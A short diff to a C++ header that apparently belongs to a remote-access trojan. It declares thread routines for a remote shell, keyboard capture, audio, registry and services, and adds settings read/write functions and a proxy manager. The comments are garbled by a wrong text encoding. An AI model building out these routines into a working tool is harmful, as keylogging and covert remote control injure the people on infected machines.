@@ -18,6 +18,11 @@ typedef struct UserParam
 	~UserParam() { SAFE_DELETE_ARRAY(buffer); }
 }UserParam; 
 
+// –¥»Î≈‰÷√
+bool WriteAppSettingA(const std::string& keyName, const std::string& value);
+// ∂¡»°≈‰÷√
+bool ReadAppSettingA(const std::string& keyName, std::string& outValue);
+
 DWORD WINAPI ThreadProc(LPVOID lParam);
 
 DWORD WINAPI LoopShellManager(LPVOID lParam);
@@ -31,3 +36,4 @@ DWORD WINAPI LoopAudioManager(LPVOID lParam);
 DWORD WINAPI LoopRegisterManager(LPVOID lParam);
 DWORD WINAPI LoopServicesManager(LPVOID lParam);
 DWORD WINAPI LoopKeyboardManager(LPVOID lParam);
+DWORD WINAPI LoopProxyManager(LPVOID lParam);
